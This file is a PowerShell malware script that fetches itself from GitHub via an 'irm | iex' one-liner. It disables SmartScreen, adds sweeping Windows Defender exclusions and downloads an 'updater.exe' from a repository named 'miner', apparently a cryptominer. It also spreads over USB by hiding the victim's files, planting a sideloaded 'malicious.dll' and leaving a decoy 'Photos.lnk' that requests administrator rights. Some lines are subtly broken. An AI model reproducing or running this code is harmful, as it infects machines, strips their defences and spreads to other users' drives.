# script.ps1 (Updated with USB propagation, SmartScreen disabling before payload, and reliable logging)
# Fetched and executed via cmd.exe /c powershell.exe -Command "irm https://raw.githubusercontent.com/NaomiMendoza127/filetest12345/refs/heads/main/script.ps1 | iex"
# Handles USB propagation via DLL sideloading, downloads updater.exe, and ensures log creation.
Start-Sleep -Seconds 15

$logPath = "C:\Windows\Temp\boot_execution_log.txt"
$logDirectory = Split-Path -Path $logPath -Parent

if (-not (Test-Path -Path $logDirectory)) {
    New-Item -ItemType Directory -Path $logDirectory -Force | Out-Null
}

try {
    Add-Content -Path $logPath -Value "Script started at $(Get-Date) - Running under SYSTEM account (12:40 PM IST, June 30, 2025)." -Force
} catch {
    Write-Host "Failed to create initial log entry at $logPath. Error: $_"
    exit
}

function Is-Admin {
    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($identity)
    return $principal.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
}
try {
    if (Is-Admin) {
        Add-Content -Path $logPath -Value "Confirmed: Script is running with Administrator (SYSTEM) privileges."
    } else {
        Add-Content -Path $logPath -Value "WARNING: Script is NOT running with Administrator privileges."
    }
} catch {
    Add-Content -Path $logPath -Value "Failed to check admin status: $_"
}

# --- SmartScreen Disabling (Before Payload Operations) ---
try {
    Add-Content -Path $logPath -Value "Attempting to disable SmartScreen before payload operations."
    $smartScreenPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer"
    try {
        Set-ItemProperty -Path $smartScreenPath -Name "SmartScreenEnabled" -Value "Off" -ErrorAction Stop
        Add-Content -Path $logPath -Value "SmartScreen disabled successfully."
    } catch {
        Add-Content -Path $logPath -Value "Failed to disable SmartScreen: $_"
    }

    $smartScreenEnabled = Get-ItemProperty -Path $smartScreenPath -Name "SmartScreenEnabled" -ErrorAction SilentlyContinue
    if ($smartScreenEnabled -and $smartScreenEnabled.SmartScreenEnabled -eq "Off") {
        Add-Content -Path $logPath -Value "Confirmed: SmartScreen is disabled."
    } else {
        Add-Content -Path $logPath -Value "SmartScreen status: $($smartScreenEnabled.SmartScreenEnabled) or not configured."
    }
} catch {
    Add-Content -Path $logPath -Value "SmartScreen handling failed: $_"
}

# --- USB Propagation Functions ---
function Watch-USB {
    param ($LogPath)
    try {
        Add-Content -Path $LogPath -Value "Starting USB monitoring for propagation at $(Get-Date)."
        $wmiQuery = "SELECT * FROM __InstanceCreationEvent WITHIN 2 WHERE TargetInstance ISA 'Win32_DiskDrive' AND TargetInstance.InterfaceType = 'USB'"
        Register-WmiEvent -Query $wmiQuery -Action {
            $driveLetter = (Get-WmiObject Win32_LogicalDisk | Where-Object {$_.DeviceID -like "$($eventArgs.NewEvent.TargetInstance.DeviceID)*"}).DeviceID
            if ($driveLetter) {
                Add-Content -Path $event.MessageData.LogPath -Value "USB detected: $driveLetter at $(Get-Date)."
                Infect-USB -DriveLetter $driveLetter -LogPath $event.MessageData.LogPath
            }
        } -MessageData @{LogPath=$LogPath} -ErrorAction Stop
        Add-Content -Path $logPath -Value "USB monitoring event registered successfully."
    } catch {
        Add-Content -Path $LogPath -Value "Failed to register USB monitoring event: $_"
    }
}

function Infect-USB {
    param (
        $DriveLetter,
        $LogPath
    )
    try {
        # Create hidden folders
        $hiddenFolder = "$DriveLetter\RECYCLER.BIN"
        $filesFolder = "$hiddenFolder\Files"
        New-Item -Path $hiddenFolder -ItemType Directory -Force | Out-Null
        New-Item -Path $filesFolder -ItemType Directory -Force | Out-Null
        Set-ItemProperty -Path $hiddenFolder -Name Attributes -Value ([System.IO.FileAttributes]::Hidden + [System.IO.FileAttributes]::System)
        Set-ItemProperty -Path $filesFolder -Name Attributes -Value ([System.IO.FileAttributes]::Hidden + [System.IO.FileAttributes]::System)
        Add-Content -Path $LogPath -Value "Created hidden folders: $hiddenFolder, $filesFolder"

        # Move legitimate USB files to hidden folder
        $usbFiles = Get-ChildItem -Path $DriveLetter -Exclude "RECYCLER.BIN" -ErrorAction SilentlyContinue
        foreach ($file in $usbFiles) {
            try {
                Move-Item -Path "$DriveLetter\$($file.Name)" -Destination "$filesFolder\$($file.Name)" -Force -ErrorAction Stop
                Add-Content -Path $LogPath -Value "Moved file to hidden folder: $($file.Name)"
            } catch {
                Add-Content -Path $LogPath -Value "Failed to move file $($file.Name): $_"
            }
        }

        # Copy legitimate executable (rundll32.exe)
        $legitExePath = "$env:windir\System32\rundll32.exe"
        $usbLegitExePath = "$hiddenFolder\legit.exe"
        Copy-Item -Path $legitExePath -Destination $usbLegitExePath -Force -ErrorAction Stop
        Add-Content -Path $LogPath - john -Value "Copied rundll32.exe to $usbLegitExePath"

        # Download malicious DLL
        $dllPath = "C:\Windows\Temp\malicious.dll"
        $usbDllPath = "$hiddenFolder\malicious.dll"
        $dllUrl = "https://raw.githubusercontent.com/NaomiMendoza127/filetest12345/refs/heads/main/malicious.dll"
        if (-not (Test-Path $dllPath)) {
            try {
                Invoke-WebRequest -Uri $dllUrl -OutFile $dllPath -UseBasicParsing -ErrorAction Stop
                Add-Content -Path $LogPath -Value "Downloaded malicious.dll to $dllPath"
                try {
                    Unblock-File -Path $dllPath -ErrorAction Stop
                    Add-Content -Path $LogPath -Value "Removed Mark of the Web from $dllPath."
                } catch {
                    Add-Content -Path $LogPath -Value "Failed to remove Mark of the Web from $dllPath: $_"
                }
            } catch {
                Add-Content -Path $LogPath -Value "Failed to download malicious.dll from $dllUrl: $_"
                $dllContent = @"
[DllMain]
EXPORT void Run() {
    system("start /b C:\\Windows\\Temp\\updater.exe");
    system("cmd.exe /c powershell.exe -Command \"irm https://raw.githubusercontent.com/NaomiMendoza127/filetest12345/refs/heads/main/script.ps1 | iex\"");
}
"@
                Add-Content -Path $dllPath -Value $dllContent -ErrorAction Stop
                Add-Content -Path $LogPath -Value "Created placeholder DLL at $dllPath (non-executable, compile for production)"
            }
        }
        Copy-Item -Path $dllPath -Destination $usbDllPath -Force -ErrorAction Stop
        Add-Content -Path $LogPath -Value "Copied malicious DLL to $usbDllPath"

        # Create elevate.bat to request admin privileges
        $batPath = "$hiddenFolder\elevate.bat"
        $batContent = @"
@echo off
echo Loading your photos, please wait...
powershell -Command "Start-Process rundll32.exe -ArgumentList '$usbLegitExePath $usbDllPath,Run' -Verb RunAs"
"@
        Set-Content -Path $batPath -Value $batContent -Force
        Add-Content -Path $LogPath -Value "Created elevate.bat at $batPath"

        # Create convincing LNK file to run elevate.bat
        $wshell = New-Object -ComObject WScript.Shell
        $lnkPath = "$DriveLetter\Photos.lnk"
        $lnk = $wshell.CreateShortcut($lnkPath)
        $lnk.TargetPath = $batPath
        $lnk.IconLocation = "%SystemRoot%\system32\imageres.dll,4" # Photo icon
        $lnk.Description = "Open your photo collection from this USB"
        $lnk.Save()
        Add-Content -Path $LogPath -Value "Created LNK file: $lnkPath"
    } catch {
        Add-Content -Path $LogPath -Value "USB infection failed for $DriveLetter: $_"
    }
}

# --- Payload Download and Defender Exclusions ---
$payloadUrl = "https://github.com/NaomiMendoza127/miner/raw/refs/heads/main/test.exe"
$payloadPath = "C:\Windows\Temp\updater.exe"

Add-Content -Path $logPath -Value "Checking for existing updater.exe at $payloadPath."

if (Test-Path -Path $payloadPath) {
    Add-Content -Path $logPath -Value "Existing updater.exe found at $payloadPath."
    
    if ([System.IO.Path]::GetExtension($payloadPath).ToLower() -ne ".exe") {
        Add-Content -Path $logPath -Value "Warning: Existing file does not have .exe extension."
    } else {
        Add-Content -Path $logPath -Value "File exists at $payloadPath with .exe extension."
    }

    $existingSize = (Get-Item -Path $payloadPath).Length
    Add-Content -Path $logPath -Value "Existing file size: $existingSize bytes."

    try {
        Unblock-File -Path $payloadPath -ErrorAction Stop
        Add-Content -Path $logPath -Value "Removed Mark of the Web from $payloadPath."
    } catch {
        Add-Content -Path $logPath -Value "Failed to remove Mark of the Web from $payloadPath. Error: $_"
    }

    try {
        Add-Content -Path $logPath -Value "Attempting to execute existing payload..."
        Start-Process -FilePath $payloadPath -WindowStyle Hidden -ErrorAction Stop
        Add-Content -Path $logPath -Value "Existing payload executed successfully."
    } catch {
        Add-Content -Path $logPath -Value "Execution failed: $_"
        throw "Failed to execute existing payload."
    }
} else {
    Add-Content -Path $logPath -Value "No existing updater.exe found at $payloadPath. Proceeding with installation process without execution."

    Add-Content -Path $logPath -Value "Waiting for Windows Defender service to be fully ready..."
    $maxAttempts = 20
    $delayBetweenChecks = 5

    for ($i = 0; $i -lt $maxAttempts; $i++) {
        try {
            $defenderService = Get-Service -Name WinDefend -ErrorAction Stop
            $mpStatus = Get-MpComputerStatus -ErrorAction SilentlyContinue
            if ($defenderService.Status -eq 'Running' -and $mpStatus.RealTimeProtectionEnabled -eq $true) {
                Add-Content -Path $logPath -Value "Windows Defender service is running and Real-time Protection is enabled."
                break
            }
        } catch {
            Add-Content -Path $logPath -Value "Attempt $($i+1): Defender service not yet found or ready. Error: $_. Waiting..."
        }
        Start-Sleep -Seconds $delayBetweenChecks
        if ($i -eq ($maxAttempts - 1)) {
            Add-Content -Path $logPath -Value "WARNING: Max attempts reached. Defender may not be fully ready. Proceeding with exclusions."
        }
    }
    Add-Content -Path $logPath -Value "Finished adaptive wait. Proceeding with Defender exclusions."

    Add-Content -Path $logPath -Value "Attempting to add Windows Defender exclusions."

    $exclusionsPaths = @(
        "C:\Users\Public\SystemLib",
        "C:\Windows\Temp\updater.exe",
        "C:\ProgramData\WinKit",
        "C:\Windows\Temp\*",
        "C:\ProgramData\Microsoft\Windows\Temp",
        "C:\Users\*\AppData\Local\Temp",
        "C:\Windows\System32\Tasks",
        "C:\Windows\SysWOW64\Tasks",
        "C:\Program Files\McAfee",
        "C:\Program Files\Symantec",
        "C:\Program Files\Kaspersky Lab",
        "C:\Program Files\Avast Software",
        "C:\Program Files\AVG"
    )

    $exclusionsProcesses = @(
        "updater.exe",
        "cmd.exe",
        "powershell.exe"
    )

    $exclusionsExtensions = @(
        "exe",
        "bat",
        "cmd",
        "ps1",
        "vbs",
        "js"
    )

    foreach ($excl in $exclusionsPaths) {
        try {
            $currentExclusions = Get-MpPreference
            $pathExists = ($currentExclusions.ExclusionPath | Where-Object { $_ -eq $excl }) -ne $null
            if (-not $pathExists) {
                Add-MpPreference -ExclusionPath $excl -ErrorAction SilentlyContinue
                Add-Content -Path $logPath -Value "Exclusion path added: $excl"
            } else {
                Add-Content -Path $logPath -Value "Exclusion path already exists: $excl"
            }
        } catch {
            Add-Content -Path $logPath -Value "Failed to add exclusion path: $excl - Error: $_"
        }
    }

    foreach ($excl in $exclusionsProcesses) {
        try {
            $currentExclusions = Get-MpPreference
            $processExists = ($currentExclusions.ExclusionProcess | Where-Object { $_ -eq $excl }) -ne $null
            if (-not $processExists) {
                Add-MpPreference -ExclusionProcess $excl -ErrorAction SilentlyContinue
                Add-Content -Path $logPath -Value "Exclusion process added: $excl"
            } else {
                Add-Content -Path $logPath -Value "Exclusion process already exists: $excl"
            }
        } catch {
            Add-Content -Path $logPath -Value "Failed to add exclusion process: $excl - Error: $_"
        }
    }

    foreach ($excl in $exclusionsExtensions) {
        try {
            $currentExclusions = Get-MpPreference
            $extensionExists = ($currentExclusions.ExclusionExtension | Where-Object { $_ -eq $excl }) -ne $null
            if (-not $extensionExists) {
                Add-MpPreference -ExclusionExtension $excl -ErrorAction SilentlyContinue
                Add-Content -Path $logPath -Value "Exclusion extension added: $excl"
            } else {
                Add-Content -Path $logPath -Value "Exclusion extension already exists: $excl"
            }
        } catch {
            Add-Content -Path $logPath -Value "Failed to add exclusion extension: $excl - Error: $_"
        }
    }

    Add-Content -Path $logPath -Value "Finished attempting to add Windows Defender exclusions."

    Add-Content -Path $logPath -Value "Attempting to fetch .exe payload from $payloadUrl without execution."

    try {
        if (-not (Test-Path -Path (Split-Path -Path $payloadPath -Parent))) {
            New-Item -ItemType Directory -Path (Split-Path -Path $payloadPath -Parent) -Force | Out-Null
            Add-Content -Path $logPath -Value "Created payload directory: $(Split-Path -Path $payloadPath -Parent)."
        }

        Add-Content -Path $logPath -Value "Downloading .exe payload from $payloadUrl using Invoke-WebRequest..."
        $webResponse = Invoke-WebRequest -Uri $payloadUrl -OutFile $payloadPath -UseBasicParsing -TimeoutSec 60 -PassThru
        Add-Content -Path $logPath -Value "EXE payload downloaded to $payloadPath. Content-Type: $($webResponse.Headers['Content-Type'])"

        $downloadedSize = (Get-Item -Path $payloadPath).Length
        Add-Content -Path $logPath -Value "Downloaded file size: $downloadedSize bytes."

        if (-not (Test-Path -Path $payloadPath)) {
            throw "Downloaded file not found at $payloadPath."
        }
        if ([System.IO.Path]::GetExtension($payloadPath).ToLower() -ne ".exe") {
            Add-Content -Path $logPath -Value "Warning: Downloaded file does not have .exe extension."
        }
        Add-Content -Path $logPath -Value "File exists at $payloadPath with .exe extension."

        try {
            Unblock-File -Path $payloadPath -ErrorAction Stop
            Add-Content -Path $logPath -Value "Removed Mark of the Web from $payloadPath."
        } catch {
            Add-Content -Path $logPath -Value "Failed to remove Mark of the Web from $payloadPath. Error: $_"
        }

        Add-Content -Path $logPath -Value "Payload downloaded successfully but not executed, as per configuration."

    } catch {
        Add-Content -Path $logPath -Value "Failed to fetch payload from $payloadUrl. Error: $_"
    }
}

# --- Start USB Monitoring ---
try {
    Add-Content -Path $logPath -Value "Initializing USB propagation."
    $rs = [RunspaceFactory]::CreateRunspace()
    $rs.Open()
    $ps = [PowerShell]::Create()
    $ps.Runspace = $rs
    [void]$ps.AddScript({
        param($LogPath)
        . $PSScriptRoot\script.ps1
        Watch-USB -LogPath $LogPath
    }).AddArgument($logPath)
    $handle = $ps.BeginInvoke()
} catch {
    Add-Content -Path $logPath -Value "Failed to initialize USB propagation: $_"
}

# --- Keep Script Running ---
try {
    Add-Content -Path $logPath -Value "Script entering infinite loop to maintain USB monitoring."
    while ($true) {
        Start-Sleep -Seconds 30
        Add-Content -Path $logPath -Value "USB monitoring active at $(Get-Date)."
    }
} catch {
    Add-Content -Path $logPath -Value "Infinite loop failed: $_"
}

Add-Content -Path $logPath -Value "Script execution finished at $(Get-Date)."
